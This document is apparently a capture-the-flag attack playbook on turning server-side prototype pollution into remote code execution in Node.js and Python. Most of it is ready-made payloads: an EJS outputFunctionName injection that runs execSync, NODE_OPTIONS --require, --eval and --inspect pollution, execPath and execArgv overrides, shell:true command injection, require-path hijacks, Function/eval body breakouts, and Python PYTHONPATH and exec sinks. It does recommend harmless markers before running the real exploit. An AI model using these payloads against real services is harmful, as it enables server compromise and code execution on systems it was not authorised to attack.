# Pollution → RCE — the server-side escalation atlas

The write primitive pays for code execution when the polluted name
is read by a code-loading sink: a template compiler embedding the
name into generated source, a spawn env that loads a module, a
`require`/`import` resolution, a `Function`/`eval` body.

---

## 1. The sink taxonomy

| Sink class | The read | Property to pollute |
|---|---|---|
| template-compile | `compile(tpl, opts)` → generated `function` body | `outputFunctionName`, `variable`, `localsName`, `imports`, `filters`, `helpers`, `globals`, `escape`, `escapeFunction` |
| spawn env | `spawn(cmd, {env: merged})` | `env.NODE_OPTIONS`, `env.LD_PRELOAD`, `env.BASH_ENV`, `env.PYTHONPATH`, `env.PATH` |
| spawn opts | `spawn(cmd, opts)` reads | `shell`, `execPath`, `execArgv`, `argv0`, `cwd`, `uid`, `gid`, `stdio`, `detached` |
| require | `require(name)`/`require.resolve` | `main`, `paths`, `extensions`, `modulePath`, `specifier`, `dir` |
| Function/eval | `new Function(x)`, `eval(x)` | the option feeding the body |
| vm | `vm.runInContext(x)`/`Script` | the option feeding `code`/`filename` |
| worker | `new Worker(path, {workerData})` | `workerData.eval`, `execArgv`, `path` |
| child_process.fork | `fork(modulePath)` | `modulePath`, `execArgv`, `execPath`, `env` |
| import | dynamic `import(spec)` | `specifier`, `paths`, `main` |
| deserialization helpers | `pickle.load`-ish via `__class__` | class-path attrs |

## 2. The EJS path — the canonical RCE gadget

```js
// ejs compiles a function whose body contains:
//   var <outputFn> = ...
// with opts.outputFunctionName injected as a raw identifier —
// a polluted name carries arbitrary JS into the generated function:
opts.outputFunctionName = "x;require('child_process').execSync('id>/tmp/o');var y"
// → var x;CODE;var y = ...   — balanced, parses, runs on render()
```

The pollution write: `{"__proto__":{"outputFunctionName":"x;CODE;var y"}}`
then ANY `ejs.render/compile` call whose options object lacks its
own `outputFunctionName` — the fallback read picks yours.

The marker version first: `"x;__append('PP');var y"` writes `PP`
into the output — proves the generated-code path without a side
effect.

## 3. The NODE_OPTIONS path

```js
{"__proto__":{"env":{"NODE_OPTIONS":"--require /tmp/x.js"}}}
{"__proto__":{"env":{"NODE_OPTIONS":"--eval 'CODE'"}}}
{"__proto__":{"env":{"NODE_OPTIONS":"--inspect=0.0.0.0:9229"}}}
```

Pays when the app spawns a node subprocess (`fork`, `exec` of a node
command, `spawn('node', ...)`) — the child inherits the polluted
env, `NODE_OPTIONS` applies on node startup. The module at `/tmp/x.js`
must exist — drop it via upload/`$rename`/`file_write` first, or use
`--eval` for a direct snippet.

`--inspect` is the quiet variant — opens the debug port; `curl` the
`/json/list` endpoint, attach, evaluate. Slower but no file needed.

## 4. The `execPath`/`execArgv`/`workerData` fork-path

```js
{"__proto__":{"execPath":"/tmp/node"}}
{"__proto__":{"execArgv":["--eval","CODE"]}}
{"__proto__":{"modulePath":"/tmp/x.js"}}
{"__proto__":{"workerData":{"eval":"CODE"}}}
```

`fork(modulePath, args, opts)` reads `execPath`/`execArgv`/`env` from
opts — a polluted fallback replaces which binary runs or which args.
`Worker` reads `workerData` — `workerData.eval` doesn't exec by
itself but reaches the worker's own code if it evals its data.

## 5. `shell: true` — the quoting escape

```js
{"__proto__":{"shell":true}}
```

`spawn(cmd, args)` with `shell:true` runs `cmd arg1 arg2` through
`/bin/sh -c` — a space in `cmd`/`args` becomes shell syntax. When
the app spawns `convert input.png output.png` and you control
`output.png` (or the cmd), `shell:true` + `;` injection = command
injection from a polluted option.

## 6. The `require`/`import` resolution writes

```js
{"__proto__":{"main":"/tmp/x.js"}}
{"__proto__":{"paths":["/tmp/node_modules"]}}
{"__proto__":{"extensions":{".js":"/tmp/x"}}}
{"__proto__":{"modulePath":"/tmp/x.js"}}
{"__proto__":{"specifier":"file:///tmp/x.mjs"}}
{"__proto__":{"dir":"/tmp"}}
```

Any `require(name)` whose resolution reads a polluted `paths`/`main`
loads your file. `require.resolve` and `Module._resolveFilename`
read `paths` — a polluted `paths` prepends `/tmp` to the search.

## 7. The `vm` sink

```js
vm.runInNewContext(code, sandbox, opts)   // pollute 'code'? no —
// pollute the OPTIONS vm reads: filename, timeout, context props
{"__proto__":{"filename":"/tmp/x.js"}}
{"__proto__":{"contextName":"x;CODE;y"}}
```

`vm` context properties are the interesting ones — a polluted name
that becomes a global inside the sandbox is a sandbox escape aid.

## 8. The `Function`/`eval` body write

When an option feeds a `new Function(body)` or `eval(body)`:

```js
{"__proto__":{"filter":"return true}); CODE; (function(){"}}
{"__proto__":{"comparator":"x;CODE;var y"}}
{"__proto__":{"validate":"1);CODE;("}}
{"__proto__":{"format":"x'};CODE;//"}}
{"__proto__":{"pre":"x;CODE;//"}}
{"__proto__":{"post":"x;CODE;//"}}
{"__proto__":{"hook":"x;CODE;//"}}
{"__proto__":{"plugin":"x;CODE;//"}}
{"__proto__":{"middleware":"x;CODE;//"}}
```

Match the body-wrapper's grammar — a `return x` context needs the
`});CODE;(`-style closer; an assignment needs the `;CODE;//` closer.

## 9. The Jinja/Python RCE

For Python class pollution the exec sinks:

```python
# pollute os.environ or __globals__ then trigger:
os.system(os.environ['X'])              # env read → cmd
subprocess.call(..., env=os.environ)    # BASH_ENV/LD_PRELOAD paths
__import__('os').system(...)            # via __builtins__ shadow
exec(globals_['x'])                     # a polluted module global
eval(config['expr'])                    # a config expression
importlib.import_module(name)           # polluted 'name'/paths
pickle.loads                            # a pickled blob the app loads
```

`PYTHONPATH`+`import` is the Python `NODE_OPTIONS`: pollute
`os.environ['PYTHONPATH']='/tmp'` then trigger an `import x` where
`/tmp/x.py` is your file.

## 10. The marker-first discipline

Every RCE gadget gets a harmless proof first:

| Gadget | Harmless marker |
|---|---|
| outputFunctionName | `x;__append('PP');var y` |
| NODE_OPTIONS | `--eval 'console.error("PP")'` — a stderr marker |
| execPath | a script that writes a file marker |
| shell | a benign `;echo PP` |
| require main | `/tmp/x.js` that writes a marker |
| Function body | `x;throw new Error('PP')` — error-based marker |
| PYTHONPATH | `/tmp/x.py` printing a marker on import |

The marker proves the generated-code/env/load path fired — only
then does the flag-read variant run.

## 11. The blast-radius ledger line

```bash
python3 tools/state.py <chal> --hypothesis "pp->ejs outputFunctionName rce" \
  --decision "harmless marker first; cleanup required after proof"
```
